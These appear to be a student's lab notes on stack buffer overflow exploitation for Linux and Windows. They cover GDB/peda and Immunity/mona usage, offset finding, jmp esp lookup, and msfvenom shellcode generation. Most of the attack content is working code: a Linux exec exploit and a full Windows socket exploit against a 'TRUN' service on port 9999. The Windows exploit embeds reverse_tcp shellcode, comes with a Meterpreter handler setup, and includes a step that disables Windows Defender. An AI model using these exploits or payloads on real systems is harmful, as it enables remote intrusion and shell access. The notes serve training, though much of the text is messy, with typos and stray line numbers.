
# Buffer Overflow Common Terms
* Heap
* Stack
* Registers
* Instruction Pointer
* Stack Pointer
* Base Pointer
* Function
* Shellcode
# Buffer Overflow Defenses
* Non executable (NX) Stack
* Address Space Layout Randomization (ASLR)
* Data Execution Prevention (DEP)
* Stack Canaries
* Position Independent Excutable (PIE)
# GDB Uses
* installation pf peda plugin
    git clone https://github.com/longld/peda.git ~/peda
    echo "source ~/peda/peda.py" >> ~/.gdbinit
### Common Commands
```
disass <FUNCTION>     # Disassemble portion of the program
info <...>    # Supply info for specific stack areas
x/256c $<REGISTER>    # Read characters from specific register
break <address>    # Establish a break point
run <<<$(echo "asdfghjlklk")    # Goes into standard in of program. It makes it take an arguement before running the program
info functions    # Lists all the functions
pdisass main    # Lists the main function. (Can do this to any function)
info proc map    # Gets a map of the process
```
# Demo Linux
* [Buffer-Overflow-Generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)
  - Look for "EIP" It should have a specific value from the characters you overflowed it with, copy the hex value determine the overflow amount
* To see the size of the stack, do "info proc map" and note the line with [heap], the line below that has a start addr (this is the start of the stack). Note the end addr of the line that has [stack] in it.
* find /b command:
  - `0xff` is jmp
  - `0xe4` is ESP
* `\x90` is NOP
```
run ./func <<<$(echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa")  # what thi does id run func and uses command substitution starting at the gators to input bad strings
   
# Find out the overflow value
# Exit
# Enter a fresh gdb session without peda
*STEP 1 env - gdb ./func    # This allows you to do that ^
* pdisass getuserinput # shows code for a function called getuserinput
* shell takes you to your lin ops lines type exit to go back to gdb
* type run then do the overflow of characters 
* show env    # Lists variables
##   # redirects the input to run the file we created that will spam "A" however many times we want
## copy hex value in the EIP after the 0x

```
 #!/usr/bin/env python 
   
   buffer = "A" * 62
   eip = "BBBB"
   
   print(buffer+eip)
```
## the code aboce does a buffer overflow and replaces the EIP to check for validity 
## * unset env <variable>    # This unsets a variable
* info proc map    # Gets a map of the process after the crash
```
crash:
tarting program: /home/student/func 
Enter a string: 
ddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd

Program received signal SIGSEGV, Segmentation fault.
0x64646464 in ?? ()
```            1            2       3     4
* find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4    # find /b <starting location of stack>, <ending location of the stack>, <jmp>, <esp>
# Take first 4 and make them little endian
```
### Flipping bytes from big to little endian
```
#0xf7de3b59 -> 0xf7 de 3b 59 -> "\x59\x3b\xde\xf7"
#0xf7f588ab -> 0xf7 f5 88 ab -> "\xab\x88\xf5\xf7"
#0xf7f645fb -> 0xf7 f6 45 fb -> "\xfb\x45\xf6\xf7"
#0xf7f6460f -> 0xf7 f6 46 0f -> "\x0f\x46\xf6\xf7"
```
### MSFVENOM Command
* We are tellig it do create a payload that executes msf
* Then we are telling it that its going to execute the whoami command (1)
* Then then tell it to not use the NULL Byte (2)
* Finally we tell it to format it to python (3)
```                              1           2         3
msfvenom -p
linux/x86/exec CMD=whoami -b '\x00' -f python    # Creates payload
msfvenom --list payloads    # Lists all the payloads
```
## shell code we push onto the program 
buf =  b""
buf += b"\xba\xf9\xfc\xc9\x23\xdd\xc3\xd9\x74\x24\xf4\x58"
buf += b"\x31\xc9\xb1\x0b\x83\xe8\xfc\x31\x50\x10\x03\x50"
buf += b"\x10\x1b\x09\xa3\x28\x83\x6b\x66\x49\x5b\xa1\xe4"
buf += b"\x1c\x7c\xd1\xc5\x6d\xea\x22\x72\xbd\x88\x4b\xec"
buf += b"\x48\xaf\xde\x18\x4d\x2f\xdf\xd8\x25\x47\xb0\xb9"
buf += b"\xa4\xfe\x4e\x6d\x64\x89\xae\x5c\x0a"

## how to generate shell code via msfconsole
payload/linux/x86/exec
show options 
set cmd whoami
    then show options to verify

## your script to get the code to work should be this (shell code is buf and is variable)
!/usr/bin/env python 
   
buffer = "A" * 62
eip = "\x59\x3b\xde\xf7"
nop = "\x90" * 15
buf =  b""
buf += b"\xbb\x35\x5d\x8c\xf4\xd9\xed\xd9\x74\x24\xf4\x5a"
buf += b"\x2b\xc9\xb1\x0b\x31\x5a\x14\x83\xea\xfc\x03\x5a"
buf += b"\x10\xd7\xa8\xe6\xff\x4f\xca\xa5\x99\x07\xc1\x2a"
buf += b"\xef\x30\x71\x82\x9c\xd6\x82\xb4\x4d\x44\xea\x2a"
buf += b"\x1b\x6b\xbe\x5a\x1c\x6b\x3f\x9b\x54\x03\x50\xfa"
buf += b"\xf7\xba\xae\xab\x54\xb5\x4e\x9e\xdb"
print(buffer+eip+nop+buf)

then run on the gdb-peda with: run <<<$(./buff.py)

 ## run <<< $(./buffer.py)            runs the file loaded with the file command and runs it with the script 
## Starting program: /home/student/SECURITY/inventory.exe <<< $(./buffer.py)

once the script and stuff works for a windows machine all you need to change on the script is the EIP

## steps to do for exploiting a buffer overflow on linux 
1. env - gdb ./exe or gdb
2. run the file and spam characters from the generator to get a segmentation fault
3. unset the envs, 
4. then run info proc map
5. run find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4
6. Take first 4 and make them little endian
7. take the first one and make it your eip 
8.generate shellcode with msfvenom
9. store into the script then run
        (file ./<file> then type: run <<< $(./<script>)
## it is imprtant to note transferring scripts across machines requires to replace eip because the eip youll use on yourlinops will be different from the web server

## how to use debugger and accomplish our exploit
1. env - gdb /path/.exe 
2. run # runs the executable to prepare for the overflow
3. after getting a SIGSEGV mesage do: info proc map
4. use the command find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4
5. then take first 4 to make little endian, put the first one as your EIP in the script 
6. sudo (because we needed root to run against the file we are cating) /path/.exe <<< $(~/buffer.py)

when you see a strcopy string its vulnerable to overflow
netstat -anob
task manager > performance > open resource monitor to see what port and processes run 
use: nc <your ip> <port opened by serversind>         to interact with the port that is opened by a process 
 
```
# Demo Windows
### The Setup
* Run strings.exe on the executable      # .\downloads\SYSINTERNALS\strings.exe .\downloads\.exe
* Look for vulnerable variables        # strcopy and no stack protection 
* Go to [Buffer-Overflow-Generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) and generate the string that will narrow the buffer offset
* Make the python [script](scripts.md)
* Make sure the program crashes and the EIP returns with the value you set
### Immunity Debugger
```
!mona modules    # This looks for vulnerable variables
!mona jmp -r esp -m "essfunc.dll"    # Looks through the variable for jmp and esp
```
### MSFVENOM COMMAND (lhost='LinOPS IP' lport='RHP')
```
msfvenom -p windows/shell/reverse_tcp lhost=10.50.30.231 lport=1234 -b "\x00" -f python
```
### MSFCONSOLE
```
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport <PORT SET IN MSFVENOM>
run
```
```
## windows exploit
1.
  #!/usr/bin/env python
  import socket
 
  buf = "TRUN /.:/" 
  buf += "<2200 chars>"
  
   s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
   s.connect(("192.168.65.10", 9999))
   print s.recv(1024)
   s.send(buf)
   print s.recv(1024)
          
   s.close()

# 2. once the immunity debugger has the process its running crash and record the eip to gt the buffer

# 3. replace your 2200 chars with the buffer, then to check write a new buf line so its like this
4.  import socket
  3 
  4 buf = "TRUN /.:/"
  5 buf += "A" * 2003
  6 buf += "BBBB"
  7 s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  8 s.connect(("192.168.65.10", 9999))
  9 print s.recv(1024)
 10 s.send(buf)
 11 print s.recv(1024)
 12 
 13 s.close()

# 4. once rerun you can also run !mona modules to see what is vulnrable 
# 5. !mona jmp -r esp -m "essfunc.dll" to find jm locations in the dll, look for the 9 pointers and grab the first 4 copy the address and change the uppercase letters to lowercase

# 6. replace the 4 Bs wiht the first one you grab thatll be your jmp esp location 
# 7. generate shellcode with  msfvenom -p windows/shell/reverse_tcp lhost=<linops ip> lport=<RH> -b "\x00" -f python
# 8. use msfconsole to give the following:
        ayload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
  this doesnt matter >>> EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     0.0.0.0          yes       The listen address (an interface may be specified)
   LPORT     <RHP>            yes       The listen port

   
# 9. turn off windows defender real time protection then run the multi/handler exploit

# 10. meterpreter shell should be established now 

## script should look like this 

 #!/usr/bin/env python
  2 import socket
  3 
  4 buf = "TRUN /.:/"        # command to run 
  5 buf += "A" * 2003        # buffer
  6 buf += "\xa0\x12\x50\x62"    # EIP
  7 buf += "\x90" * 15            # NOP sled
  8 # 0x625012A0 -> 0x62 50 12 a0 "\xa0\x12\x50\x62"        # info proc map
  9 # 0x625012AD
 10 
 11 buf += b"\xbb\xe3\xd2\x14\xba\xdb\xd5\xd9\x74\x24\xf4\x5d"        # shellcode from msfvenom
 12 buf += b"\x31\xc9\xb1\x59\x31\x5d\x14\x83\xc5\x04\x03\x5d"
 13 buf += b"\x10\x01\x27\xe8\x52\x4a\xc8\x11\xa3\x34\xf8\xc3"
 14 buf += b"\xc7\x3f\xa8\xd3\x8c\x6d\x41\x9d\x76\x1a\x0b\x89"
 15 buf += b"\x49\xe3\x27\xc3\x81\x14\x8f\x6e\xf4\x1b\x2f\xc2"
 16 buf += b"\xc4\x3a\xd3\x19\x19\x9c\xea\xd1\x6c\xdd\x2b\xa4"
 17 buf += b"\x1b\x32\xe1\x60\x6f\x9e\x16\x04\x2d\x22\x16\xca"
 18 buf += b"\x39\x1a\x60\x6f\xfd\xee\xdc\x6e\x2e\x5e\x56\x38"
 19 buf += b"\xd6\xd5\x30\x99\xe7\x3a\x45\x10\x93\x80\x77\x5c"
 20 buf += b"\x15\x73\x43\x29\xa7\x55\x9d\xed\x04\x98\x11\xe0"
 21 buf += b"\x55\xdd\x96\x1b\x20\x15\xe5\xa6\x33\xee\x97\x7c"
 22 buf += b"\xb1\xf0\x30\xf6\x61\xd4\xc1\xdb\xf4\x9f\xce\x90"
 23 buf += b"\x73\xc7\xd2\x27\x57\x7c\xee\xac\x56\x52\x66\xf6"
 24 buf += b"\x7c\x76\x22\xac\x1d\x2f\x8e\x03\x21\x2f\x76\xfb"
 25 buf += b"\x87\x24\x95\xea\xb8\xc5\x65\x13\xe5\x51\xa9\xde"
 26 buf += b"\x16\xa1\xa5\x69\x64\x93\x6a\xc2\xe2\x9f\xe3\xcc"
 27 buf += b"\xf5\x96\xe4\xee\x2a\x10\x64\x11\xcb\x60\xac\xd6"
 28 buf += b"\x9f\x30\xc6\xff\x9f\xdb\x16\xff\x75\x71\x1d\x97"
 29 buf += b"\xb5\x2d\x60\x73\x5e\x2f\x63\xec\x44\xa6\x85\x42"
 30 buf += b"\x29\xe8\x19\x23\x99\x48\xca\xcb\xf3\x47\x35\xeb"
 31 buf += b"\xfb\x82\x5e\x86\x13\x7a\x36\x3f\x8d\x27\xcc\xde"
 32 buf += b"\x52\xf2\xa8\xe1\xd9\xf6\x4d\xaf\x29\x73\x5e\xd8"
 33 buf += b"\x4d\x7b\x9e\x19\xf8\x7b\xf4\x1d\xaa\x2c\x60\x1c"
 34 buf += b"\x8b\x1a\x2f\xdf\xfe\x19\x28\x1f\x7f\x2b\x42\x16"
 35 buf += b"\x15\x13\x3c\x57\xf9\x93\xbc\x01\x93\x93\xd4\xf5"
 36 buf += b"\xc7\xc0\xc1\xf9\xdd\x75\x5a\x6c\xde\x2f\x0e\x27"
 37 buf += b"\xb6\xcd\x69\x0f\x19\x2e\x5c\x13\x5e\xd0\x22\x3c"
 38 buf += b"\xc7\xb8\xdc\x7c\xf7\x38\xb7\x7c\xa7\x50\x4c\x52"
 39 buf += b"\x48\x90\xad\x79\x01\xb8\x24\xec\xe3\x59\x38\x25"
 40 buf += b"\xa5\xc7\x39\xca\x7e\xf8\x40\xa3\x81\xf9\xb4\xad"
 41 buf += b"\xe5\xfa\xb4\xd1\x1b\xc7\x62\xe8\x69\x06\xb7\x4f"
 42 buf += b"\x61\x3d\x9a\xe6\xe8\x3d\x88\xf9\x38"
 43 
 44 s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)            # socket stuff for windows
 45 s.connect(("192.168.65.10", 9999))        # used the win ops ip cause we are trying to get on it and used the port the vulnerable .exe                                                    opens
 46 print s.recv(1024)
 47 s.send(buf)
 48 print s.recv(1024)
 49 
 50 s.close()
